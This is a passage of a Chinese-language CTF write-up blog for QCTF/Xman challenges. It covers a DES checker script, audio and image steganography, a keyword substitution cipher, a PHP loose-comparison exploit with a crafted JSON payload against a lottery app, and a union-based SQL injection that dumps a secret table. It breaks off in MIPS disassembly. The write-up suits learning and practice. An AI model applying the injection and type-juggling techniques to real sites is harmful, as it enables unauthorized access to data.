class="number">9</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">1</span>],     </span><br><span class="line">     [<span class="number">13</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">7</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">3</span>,  <span class="number">5</span>, <span class="number">12</span>,  <span class="number">2</span>, <span class="number">15</span>,  <span class="number">8</span>,  <span class="number">6</span>],     </span><br><span class="line">     [<span class="number">1</span>,  <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">3</span>,  <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">0</span>,  <span class="number">5</span>,  <span class="number">9</span>,  <span class="number">2</span>],     </span><br><span class="line">     [<span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>,  <span class="number">8</span>,  <span class="number">1</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">7</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>,  <span class="number">2</span>,  <span class="number">3</span>, <span class="number">12</span>]],</span><br><span class="line"></span><br><span class="line">   [[<span class="number">13</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">4</span>,  <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">9</span>,  <span class="number">3</span>, <span class="number">14</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">12</span>,  <span class="number">7</span>],     </span><br><span class="line">     [<span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>,  <span class="number">8</span>, <span class="number">10</span>,  <span class="number">3</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">11</span>,  <span class="number">0</span>, <span class="number">14</span>,  <span class="number">9</span>,  <span class="number">2</span>],     </span><br><span class="line">     [<span class="number">7</span>, <span class="number">11</span>,  <span class="number">4</span>,  <span class="number">1</span>,  <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>,  <span class="number">2</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>,  <span class="number">3</span>,  <span class="number">5</span>,  <span class="number">8</span>],     </span><br><span class="line">     [<span class="number">2</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">0</span>,  <span class="number">3</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">11</span>]]]</span><br><span class="line">     </span><br><span class="line">pc1=(<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>,  <span class="number">9</span>,</span><br><span class="line">       <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">      <span class="number">10</span>,  <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">      <span class="number">19</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">      <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line">       <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">      <span class="number">14</span>,  <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">      <span class="number">21</span>, <span class="number">13</span>,  <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">pc2= (<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>,  <span class="number">1</span>,  <span class="number">5</span>,  <span class="number">3</span>, <span class="number">28</span>,</span><br><span class="line">      <span class="number">15</span>,  <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>,  <span class="number">4</span>, </span><br><span class="line">      <span class="number">26</span>,  <span class="number">8</span>, <span class="number">16</span>,  <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>,  <span class="number">2</span>, </span><br><span class="line">      <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>, </span><br><span class="line">      <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, </span><br><span class="line">      <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">d = (  <span class="number">1</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">2</span>,  <span class="number">2</span>,  <span class="number">2</span>,  <span class="number">2</span>,  <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">__all__=[<span class="string">'desencode'</span>]</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DES</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">code</span><span class="params">(self,from_code,key,code_len,key_len)</span>:</span></span><br><span class="line">		output=<span class="string">""</span></span><br><span class="line">		trun_len=<span class="number">0</span></span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">		code_string=self._functionCharToA(from_code,code_len)</span><br><span class="line">		code_key=self._functionCharToA(key,key_len)</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> code_len%<span class="number">16</span>!=<span class="number">0</span>:</span><br><span class="line">			real_len=(code_len/<span class="number">16</span>)*<span class="number">16</span>+<span class="number">16</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			real_len=code_len</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> key_len%<span class="number">16</span>!=<span class="number">0</span>:</span><br><span class="line">			key_len=(key_len/<span class="number">16</span>)*<span class="number">16</span>+<span class="number">16</span></span><br><span class="line">		key_len*=<span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		trun_len=<span class="number">4</span>*real_len</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,trun_len,<span class="number">64</span>):</span><br><span class="line">			run_code=code_string[i:i+<span class="number">64</span>]</span><br><span class="line">			l=i%key_len</span><br><span class="line">			run_key=code_key[l:l+<span class="number">64</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			run_code= self._codefirstchange(run_code)</span><br><span class="line">			run_key= self._keyfirstchange(run_key)</span><br><span class="line">			</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">				</span><br><span class="line"></span><br><span class="line">				code_r=run_code[<span class="number">32</span>:<span class="number">64</span>]</span><br><span class="line">				code_l=run_code[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">					</span><br><span class="line"></span><br><span class="line">				run_code=code_r</span><br><span class="line">				</span><br><span class="line"></span><br><span class="line">				code_r= self._functionE(code_r)</span><br><span class="line">				</span><br><span class="line"></span><br><span class="line">				key_l=run_key[<span class="number">0</span>:<span class="number">28</span>]</span><br><span class="line">				key_r=run_key[<span class="number">28</span>:<span class="number">56</span>]</span><br><span class="line">				key_l=key_l[d[j]:<span class="number">28</span>]+key_l[<span class="number">0</span>:d[j]]</span><br><span class="line">				key_r=key_r[d[j]:<span class="number">28</span>]+key_r[<span class="number">0</span>:d[j]]</span><br><span class="line">				run_key=key_l+key_r</span><br><span class="line">				key_y= self._functionKeySecondChange(run_key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">				code_r= self._codeyihuo(code_r,key_y)</span><br><span class="line">				</span><br><span class="line"></span><br><span class="line">				code_r= self._functionS(code_r)</span><br><span class="line">				</span><br><span class="line"></span><br><span class="line">				code_r= self._functionP(code_r)</span><br><span class="line">				</span><br><span class="line"></span><br><span class="line">				code_r= self._codeyihuo(code_l,code_r)</span><br><span class="line">				run_code+=code_r</span><br><span class="line"></span><br><span class="line">			code_r=run_code[<span class="number">32</span>:<span class="number">64</span>]</span><br><span class="line">			code_l=run_code[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">			run_code=code_r+code_l</span><br><span class="line">			</span><br><span class="line"></span><br><span class="line">			output+=self._functionCodeChange(run_code)</span><br><span class="line">		<span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_codeyihuo</span><span class="params">(self,code,key)</span>:</span></span><br><span class="line">		code_len=len(key)</span><br><span class="line">		return_list=<span class="string">''</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(code_len):</span><br><span class="line">			<span class="keyword">if</span> code[i]==key[i]:</span><br><span class="line">				return_list+=<span class="string">'0'</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				return_list+=<span class="string">'1'</span></span><br><span class="line">		<span class="keyword">return</span> return_list</span><br><span class="line"></span><br><span class="line">	 		 							</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_codefirstchange</span><span class="params">(self,code)</span>:</span></span><br><span class="line">		changed_code=<span class="string">''</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">			changed_code+=code[ip[i]<span class="number">-1</span>]</span><br><span class="line">		<span class="keyword">return</span> changed_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_keyfirstchange</span> <span class="params">(self,key)</span>:</span></span><br><span class="line">		changed_key=<span class="string">''</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">56</span>):</span><br><span class="line">			changed_key+=key[pc1[i]<span class="number">-1</span>]</span><br><span class="line">		<span class="keyword">return</span> changed_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_functionCodeChange</span><span class="params">(self, code)</span>:</span></span><br><span class="line">		lens=len(code)/<span class="number">4</span></span><br><span class="line">		return_list=<span class="string">''</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(lens):</span><br><span class="line">			list=<span class="string">''</span></span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">				list+=code[ip_1[i*<span class="number">4</span>+j]<span class="number">-1</span>]</span><br><span class="line">			return_list+=<span class="string">"%x"</span> %int(list,<span class="number">2</span>)</span><br><span class="line">		<span class="keyword">return</span> return_list</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_functionE</span><span class="params">(self,code)</span>:</span></span><br><span class="line">		return_list=<span class="string">''</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">			return_list+=code[e[i]<span class="number">-1</span>]</span><br><span class="line">		<span class="keyword">return</span> return_list		</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_functionP</span><span class="params">(self,code)</span>:</span></span><br><span class="line">		return_list=<span class="string">''</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">			return_list+=code[p[i]<span class="number">-1</span>]</span><br><span class="line">		<span class="keyword">return</span> return_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_functionS</span><span class="params">(self, key)</span>:</span></span><br><span class="line">		return_list=<span class="string">''</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">			row=int( str(key[i*<span class="number">6</span>])+str(key[i*<span class="number">6</span>+<span class="number">5</span>]),<span class="number">2</span>)</span><br><span class="line">			raw=int(str( key[i*<span class="number">6</span>+<span class="number">1</span>])+str(key[i*<span class="number">6</span>+<span class="number">2</span>])+str(key[i*<span class="number">6</span>+<span class="number">3</span>])+str(key[i*<span class="number">6</span>+<span class="number">4</span>]),<span class="number">2</span>)</span><br><span class="line">			return_list+=self._functionTos(s[i][row][raw],<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> return_list</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_functionKeySecondChange</span><span class="params">(self,key)</span>:</span></span><br><span class="line">		return_list=<span class="string">''</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">			return_list+=key[pc2[i]<span class="number">-1</span>]</span><br><span class="line">		<span class="keyword">return</span> return_list</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_functionCharToA</span><span class="params">(self,code,lens)</span>:</span></span><br><span class="line">		return_code=<span class="string">''</span></span><br><span class="line">		lens=lens%<span class="number">16</span></span><br><span class="line">		<span class="keyword">for</span> key <span class="keyword">in</span> code:</span><br><span class="line">			code_ord=int(key,<span class="number">16</span>)</span><br><span class="line">			return_code+=self._functionTos(code_ord,<span class="number">4</span>)		</span><br><span class="line">		<span class="keyword">if</span> lens!=<span class="number">0</span>:</span><br><span class="line">			return_code+=<span class="string">'0'</span>*(<span class="number">16</span>-lens)*<span class="number">4</span></span><br><span class="line">		<span class="keyword">return</span> return_code</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_functionTos</span><span class="params">(self,o,lens)</span>:</span></span><br><span class="line">		return_code=<span class="string">''</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(lens):</span><br><span class="line">			return_code=str(o&gt;&gt;i &amp;<span class="number">1</span>)+return_code</span><br><span class="line">		<span class="keyword">return</span> return_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tohex</span><span class="params">(string)</span>:</span></span><br><span class="line">	return_string=<span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">		return_string+=<span class="string">"%02x"</span>%ord(i)</span><br><span class="line">	<span class="keyword">return</span> return_string</span><br><span class="line">		</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tounicode</span><span class="params">(string)</span>:</span></span><br><span class="line">	return_string=<span class="string">''</span></span><br><span class="line">	string_len=len(string)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,string_len,<span class="number">2</span>):</span><br><span class="line">		return_string+=chr(int(string[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">	<span class="keyword">return</span> return_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">desencode</span><span class="params">(from_code,key)</span>:</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	from_code=tohex(from_code)</span><br><span class="line">	key=tohex(key)</span><br><span class="line">	</span><br><span class="line">	des=DES()</span><br><span class="line">	key_len=len(key)</span><br><span class="line">	string_len=len(from_code)		</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">if</span> string_len&lt;<span class="number">1</span> <span class="keyword">or</span> key_len&lt;<span class="number">1</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'error input'</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">	key_code= des.code(from_code,key,string_len,key_len)</span><br><span class="line">	<span class="keyword">return</span> key_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__  == <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="keyword">if</span>(desencode(sys.argv[<span class="number">1</span>],<span class="string">'mtqVwD4JNRjw3bkT9sQ0RYcZaKShU4sf'</span>)==<span class="string">'e3fab29a43a70ca72162a132df6ab532535278834e11e6706c61a1a7cefc402c8ecaf601d00eee72'</span>):</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'correct.'</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'try again.'</span></span><br></pre></td></tr></table></figure>
<p>是DES算法的实现脚本，待之后实现了之后再来看。贴上<a href="https://blog.csdn.net/xuchen16/article/details/81080580" target="_blank" rel="noopener">大佬wp</a>。</p>
<h2 id="Noise"><a href="#Noise" class="headerlink" title="Noise"></a>Noise</h2><p>拿到一个<code>Noise.wav</code>，发现是<code>my little pony theme song</code>。尝试用<code>mp3stego</code>后无果。再反复听了很多次，发现有一些噪音夹杂在里面。</p>
<p>看一下hint，个人认为这里最关键的是hint2，需要了解通过消除伴奏获得人声的原理。</p>
<p><img src="https://t1.aixinxi.net/o_1cj2cegpf1a1ee2s1pa318v1b5oa.png-j.jpg" alt="hint"></p>
<p>关于原理，利用声波叠加干涉消除原声，当声波的相位差达到180度的时候，就可以达到消音的效果：</p>
<p><img src="https://t1.aixinxi.net/o_1cj2c9qcj15qp1ecb120mese10tra.png-j.jpg" alt="消声的原理"></p>
<p>跟着<a href="https://www.bilibili.com/video/av560712?spm_id_from=333.338.__bofqi.15" target="_blank" rel="noopener">教程</a>学会怎么使用<code>Adobe Audition</code>，使声波相位差达到180度。</p>
<p>要提取出噪音，我们要做的就是从网上下载原版的<code>my little pony theme song</code>，然后将<code>Noise.wav</code>和它的相位差调整为180度，就可以提取出噪音。</p>
<p><img src="https://t1.aixinxi.net/o_1cj2cbta3p4c119h195f18p11usa.png-j.jpg" alt="调整相位差"></p>
<p>关于这段噪音的话，和<strong>慢扫描电视</strong>有关。利用软件<code>MMSSTV</code>，最后得到flag。</p>
<p><img src="https://t1.aixinxi.net/o_1cj2cdksn8ul9a6431i2vjgaa.png-j.jpg" alt="得到flag"></p>
<h2 id="X-man-Keyword"><a href="#X-man-Keyword" class="headerlink" title="X-man-Keyword"></a>X-man-Keyword</h2><p>也是lsb。</p>
<p><img src="https://t1.aixinxi.net/o_1cie3h9mih6q1s6mprc1s76as7a.png-j.jpg" alt="图片最上方能看出"></p>
<p>密码为图片中的<code>lovekfc</code>。</p>
<p><img src="https://t1.aixinxi.net/o_1cidmnk551p6urnj7h11pp9n0ma.png-j.jpg" alt="解出密文"></p>
<p>通过提示，将<code>LOVEKFC</code>作为关键字提到最前面，和正常顺序的英文字母进行置换。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PVSF&#123;vVckHejqBOVX9C1c13GFfkHJrjIQeMwf&#125;</span><br><span class="line"></span><br><span class="line">LOVEKFCABDGHIJMNPQRSTUWXYZ</span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line"></span><br><span class="line">QCTF...</span><br><span class="line">// 容易发现前四位正好是QCTF</span><br></pre></td></tr></table></figure>
<p>写一下脚本跑出结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s1[<span class="number">27</span>] = <span class="string">"lovekfcabdghijmnpqrstuwxyz"</span>;</span><br><span class="line">    <span class="keyword">char</span> s2[<span class="number">27</span>] = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span>;</span><br><span class="line">    <span class="keyword">char</span> s3[<span class="number">27</span>] = <span class="string">"LOVEKFCABDGHIJMNPQRSTUWXYZ"</span>;</span><br><span class="line">    <span class="keyword">char</span> s4[<span class="number">27</span>] = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    <span class="keyword">char</span> ans[<span class="number">39</span>] = <span class="string">"PVSF&#123;vVckHejqBOVX9C1c13GFfkHJrjIQeMwf&#125;"</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(ans); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">islower</span>(ans[i]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(s1); j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(ans[i] == s1[j])</span><br><span class="line">                &#123;</span><br><span class="line">                    ans[i] = s2[j];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isupper</span>(ans[i]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(s3); j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(ans[i] == s3[j])</span><br><span class="line">                &#123;</span><br><span class="line">                    ans[i] = s4[j];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://t1.aixinxi.net/o_1cidmo79822q1v4b19buf0e1icaa.png-j.jpg" alt="得到flag"></p>
<h2 id="X-man-A-face"><a href="#X-man-A-face" class="headerlink" title="X-man-A face"></a>X-man-A face</h2><p>补全二维码定位符，扫出一串类似base64的密文。</p>
<p><img src="https://t1.aixinxi.net/o_1cidmjv341c1i17dgtal13dv1uh7a.png-j.jpg" alt="补全后扫码"></p>
<p>经过尝试，通过base32解码得到flag。</p>
<p><img src="https://t1.aixinxi.net/o_1cidmmb5p1sg0115g1vr96geamqa.png-j.jpg" alt="得到flag"></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Lottery"><a href="#Lottery" class="headerlink" title="Lottery"></a>Lottery</h2><p>通过GitHack拿到源码，在api.php中：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span><span class="params">($req)</span></span>&#123;</span><br><span class="line">	require_registered();</span><br><span class="line">	require_min_money(<span class="number">2</span>);</span><br><span class="line">	$money = $_SESSION[<span class="string">'money'</span>];</span><br><span class="line">	$numbers = $req[<span class="string">'numbers'</span>];</span><br><span class="line">	$win_numbers = random_win_nums();</span><br><span class="line">	$same_count = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;<span class="number">7</span>; $i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>($numbers[$i] == $win_numbers[$i])&#123;</span><br><span class="line">			$same_count++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p><code>$numbers</code>即用户输入的数字，<code>$win_numbers</code>即随机生成的数字。根据PHP弱类型比较，例如<code>TRUE</code>和<code>1</code>和<code>&quot;1&quot;</code>相等，构造<code>&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]</code>即可中最高奖，得到flag。</p>
<h2 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h2><p>直接用联合注入判断出列数为三列后，就开始走流程emmm。</p>
<p><img src="https://t1.aixinxi.net/o_1cidmbqu5nks1jov1vrrlt01dhda.png-j.jpg" alt="得到库名"></p>
<p><img src="https://t1.aixinxi.net/o_1cidmd1l616vd1p8oj84ob2116na.png-j.jpg" alt="得到表名"></p>
<p>显而易见flag应该在<code>secret_table</code>中。</p>
<p><img src="https:////t1.aixinxi.net/o_1cidmdldqh4l12633d4ovq16v9a.png-j.jpg" alt="获取列名"></p>
<p>在<code>fl4g</code>列中得到flag：</p>
<p><img src="https://t1.aixinxi.net/o_1cidme4j61ipp1t5h1i261j6n6mua.png-j.jpg" alt="得到flag"></p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Xman-babymips"><a href="#Xman-babymips" class="headerlink" title="Xman-babymips"></a>Xman-babymips</h2><p>第一次做mips的题，百度了好久。最后在ida里装retdec插件之后再慢慢看汇编。<a href="https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-babymips/" target="_blank" rel="noopener">大佬的博客</a>里写出了每一段加密部分的伪代码。</p>
<p>先异或0x20-i，再根据奇偶性做不同的左移右移。</p>
<p>第一段加密，先对输入的字符串进行异或运算，然后再比较了前五个字符<code>Q|j{g</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">.text:00400898 loc_400898:                              # CODE XREF: sub_4007F0+30j</span><br><span class="line">.text:00400898                 lw      $v0, 0x28+var_10($fp)</span><br><span class="line">.text:0040089C                 lw      $v1, 0x28+arg_0($fp)</span><br><span class="line">.text:004008A0                 nop</span><br><span class="line">.text:004008A4                 addu    $v0, $v1, $v0</span><br><span class="line">.text:004008A8                 lb      